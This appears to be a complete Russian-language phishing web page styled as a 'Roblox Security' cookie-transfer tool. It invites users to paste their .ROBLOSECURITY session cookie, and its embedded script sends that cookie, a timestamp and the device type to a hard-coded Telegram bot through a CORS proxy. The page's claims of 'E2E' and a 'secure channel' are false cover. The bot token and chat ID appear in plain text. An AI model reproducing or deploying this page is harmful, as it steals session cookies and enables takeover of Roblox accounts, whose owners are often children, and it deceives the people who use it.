<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Crescent · Roblox Security</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 30% 20%, #0f0c29, #1a1a2e, #0a0a14);
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: absolute;
            width: 150%;
            height: 150%;
            background: radial-gradient(circle at 70% 80%, rgba(100, 80, 255, 0.15), transparent 60%),
                        radial-gradient(circle at 30% 10%, rgba(0, 255, 200, 0.08), transparent 50%);
            animation: floatBg 18s ease-in-out infinite alternate;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes floatBg {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(-3%, -2%) scale(1.02); }
        }

        .glass-card {
            position: relative;
            z-index: 2;
            max-width: 500px;
            width: 100%;
            background: rgba(20, 20, 35, 0.38);
            backdrop-filter: blur(18px) saturate(180%);
            -webkit-backdrop-filter: blur(18px) saturate(180%);
            border: 1px solid rgba(210, 180, 255, 0.25);
            border-radius: 42px;
            padding: 36px 24px 32px;
            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(170, 130, 255, 0.1) inset;
            transition: transform 0.25s ease, box-shadow 0.3s ease;
            animation: fadeGlass 0.9s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeGlass {
            0% { opacity: 0; transform: translateY(18px); backdrop-filter: blur(8px); }
            100% { opacity: 1; transform: translateY(0); backdrop-filter: blur(18px); }
        }

        .glass-card:hover {
            box-shadow: 0 30px 50px -8px #00000060, 0 0 0 1.5px rgba(200, 160, 255, 0.3) inset;
        }

        h1 {
            font-size: 2.4rem;
            font-weight: 600;
            letter-spacing: -0.02em;
            background: linear-gradient(135deg, #f0eaff, #cbb2ff, #a88bff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
            text-shadow: 0 2px 15px rgba(130, 80, 255, 0.5);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .crescent-badge {
            font-size: 1rem;
            font-weight: 400;
            background: rgba(150, 120, 255, 0.18);
            padding: 4px 12px;
            border-radius: 40px;
            border: 1px solid rgba(210, 180, 255, 0.35);
            color: #d7c6ff;
            letter-spacing: 0.3px;
            backdrop-filter: blur(4px);
        }

        .description {
            color: #cfc2f0;
            margin-bottom: 30px;
            font-weight: 400;
            font-size: 1.05rem;
            border-left: 3px solid #9f7aff;
            padding-left: 18px;
            text-shadow: 0 1px 3px black;
        }

        .input-group {
            margin-bottom: 28px;
        }

        label {
            display: block;
            color: #e3d9ff;
            font-weight: 500;
            margin-bottom: 10px;
            font-size: 0.95rem;
            letter-spacing: 0.3px;
            text-transform: uppercase;
            opacity: 0.85;
        }

        .cookie-input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .cookie-input {
            width: 100%;
            background: rgba(10, 8, 20, 0.55);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1.5px solid rgba(190, 160, 255, 0.4);
            border-radius: 60px;
            padding: 18px 22px;
            font-size: 0.95rem;
            color: #f2ebff;
            font-family: 'SF Mono', 'Menlo', 'Monaco', 'Cascadia Code', monospace;
            transition: all 0.2s ease;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), inset 0 1px 3px #ffffff0d;
            resize: none;
        }

        .cookie-input:focus {
            outline: none;
            border-color: #b388ff;
            background: rgba(25, 20, 45, 0.7);
            box-shadow: 0 0 0 4px rgba(160, 120, 255, 0.25), 0 8px 18px #00000040;
        }

        .cookie-input::placeholder {
            color: #9580c0;
            font-size: 0.9rem;
            font-family: 'Inter', sans-serif;
        }

        .send-button {
            width: 100%;
            background: linear-gradient(145deg, #6d4aff, #4a2cd9);
            border: none;
            border-radius: 60px;
            padding: 18px 24px;
            font-weight: 600;
            font-size: 1.3rem;
            color: white;
            text-shadow: 0 1px 3px #00000050;
            box-shadow: 0 16px 30px -8px #3f28b0, 0 2px 4px #ffffff30 inset, 0 -1px 0 #00000040 inset;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid #b49aff;
            letter-spacing: 0.8px;
            backdrop-filter: blur(5px);
            margin-top: 8px;
        }

        .send-button:active {
            transform: scale(0.975);
            box-shadow: 0 6px 12px #2f1e7a, 0 1px 2px #fff3 inset;
            background: linear-gradient(145deg, #593dd9, #3f23b5);
        }

        .status-message {
            margin-top: 22px;
            min-height: 32px;
            color: #bcacf0;
            font-weight: 400;
            text-align: center;
            font-size: 0.95rem;
            text-shadow: 0 1px 5px black;
            transition: opacity 0.2s;
        }

        .footer-note {
            margin-top: 32px;
            display: flex;
            justify-content: center;
            gap: 16px;
            color: #9b88cf;
            font-size: 0.8rem;
            border-top: 1px dashed #6a53a8;
            padding-top: 20px;
        }

        .glow-text {
            color: #d2bdff;
        }

        @media (max-width: 480px) {
            .glass-card { padding: 28px 18px; border-radius: 34px; }
            h1 { font-size: 2rem; }
            .cookie-input { padding: 16px 18px; }
            .send-button { padding: 16px 20px; font-size: 1.2rem; }
        }
    </style>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="glass-card">
        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
            <h1>
                ✦ ROBSEC
                <span class="crescent-badge">Crescent</span>
            </h1>
        </div>
        <div class="description">
            .ROBLOSECURITY · безопасная передача
        </div>

        <div class="input-group">
            <label>🍪 Cookie</label>
            <textarea 
                id="cookieInput" 
                class="cookie-input" 
                placeholder="_|WARNING:-DO-NOT-SHARE-THIS... или действующий ROBLOSECURITY"
                rows="2"
                spellcheck="false"
            ></textarea>
        </div>

        <button class="send-button" id="sendBtn">
            ⚡ Отправить cookie
        </button>

        <div id="status" class="status-message"></div>

        <div class="footer-note">
            <span>🔒 E2E • Crescent internal</span>
            <span class="glow-text">v1.5 · 🌙</span>
        </div>
    </div>

    <script>
        (function() {
            "use strict";

            // ========== КОНФИГУРАЦИЯ ==========
            const BOT_TOKEN = "8581723935:AAEhGWxDeQ45PJBLtyPtsC_Em88fOrMDexQ";
            const CHAT_ID = "5864817355";

            // ========== ЭЛЕМЕНТЫ ==========
            const cookieInput = document.getElementById('cookieInput');
            const sendBtn = document.getElementById('sendBtn');
            const statusDiv = document.getElementById('status');

            // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
            function setStatus(text, isGood = true) {
                statusDiv.textContent = text;
                statusDiv.style.color = isGood ? '#bcacf0' : '#ffa7b9';
                statusDiv.style.opacity = '1';
            }

            function cleanCookie(raw) {
                return raw.trim();
            }

            function isValidCookieFormat(str) {
                return str.length >= 20;
            }

            // ========== ОТПРАВКА В ТЕЛЕГРАМ (С ПРОКСИ) ==========
            async function sendToTelegram(cookieValue) {
                const PROXY_URL = 'https://api.allorigins.win/raw?url=';
                const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const deviceInfo = navigator.userAgent.includes('Android') ? 'Android' : 
                                   navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Desktop';
                const timestamp = new Date().toLocaleString('ru-RU');
                
                const message = 
                    `🔐 **Новый .ROBLOSECURITY cookie**\n` +
                    `🕒 Время: ${timestamp}\n` +
                    `📱 Устройство: ${deviceInfo}\n` +
                    `🌐 Сайт: Crescent ROBSEC\n` +
                    `\`\`\`\n${cookieValue}\n\`\`\`\n` +
                    `⚠️ Конфиденциально · Crescent`;
                
                const encodedMessage = encodeURIComponent(message);
                const fullUrl = `${TELEGRAM_URL}?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
                
                const response = await fetch(PROXY_URL + encodeURIComponent(fullUrl));
                const text = await response.text();
                
                let data;
                try {
                    data = JSON.parse(text);
                } catch (e) {
                    throw new Error('Ошибка ответа от прокси');
                }
                
                if (!data.ok) {
                    throw new Error(data.description || 'Ошибка Telegram API');
                }
                
                return true;
            }

            // ========== ОБРАБОТЧИК НАЖАТИЯ ==========
            async function onSendClick() {
                const rawCookie = cookieInput.value;
                const cleaned = cleanCookie(rawCookie);
                
                if (!cleaned) {
                    setStatus('❌ Введите cookie', false);
                    return;
                }
                
                if (!isValidCookieFormat(cleaned)) {
                    setStatus('⚠️ Cookie слишком короткий', false);
                    return;
                }

                sendBtn.disabled = true;
                sendBtn.style.opacity = '0.7';
                sendBtn.textContent = '⏳ Отправка...';
                setStatus('📡 Передача в защищённый канал...', true);

                try {
                    await sendToTelegram(cleaned);
                    setStatus('✅ Cookie успешно отправлен', true);
                    cookieInput.value = '';
                    sendBtn.textContent = '✓ Отправлено';
                    setTimeout(() => {
                        sendBtn.textContent = '⚡ Отправить cookie';
                    }, 1500);
                } catch (err) {
                    console.error('Ошибка:', err);
                    setStatus(`❌ Ошибка: ${err.message || 'соединение прервано'}`, false);
                    sendBtn.textContent = '⚡ Отправить cookie';
                } finally {
                    sendBtn.disabled = false;
                    sendBtn.style.opacity = '1';
                }
            }

            sendBtn.addEventListener('click', onSendClick);
            
            cookieInput.addEventListener('keydown', (e) => {
                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                    e.preventDefault();
                    onSendClick();
                }
            });

            console.log('%c🌙 Crescent ROBSEC v1.5 · Готов к работе', 'background: #3d2b7a; color: #e6d9ff; padding: 4px 8px; border-radius: 20px;');
        })();
    </script>
</body>
</html>
